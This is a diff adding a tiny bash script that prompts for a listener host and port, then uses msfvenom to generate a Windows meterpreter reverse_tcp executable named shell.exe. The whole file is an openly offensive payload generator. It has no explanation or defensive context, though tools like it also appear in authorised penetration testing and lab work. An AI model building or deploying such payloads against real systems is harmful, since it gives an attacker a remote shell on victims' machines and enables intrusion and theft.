@@ -1,0 +1,8 @@
+#!/bin/bash
+LHOST="$1"
+LPORT="$2"
+while [ -z "$LHOST" ]; do read -r -p 'LHOST: ' LHOST ; done
+while [ -z "$LPORT" ]; do read -r -p 'LPORT: ' LPORT ; done
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe > shell.exe
+
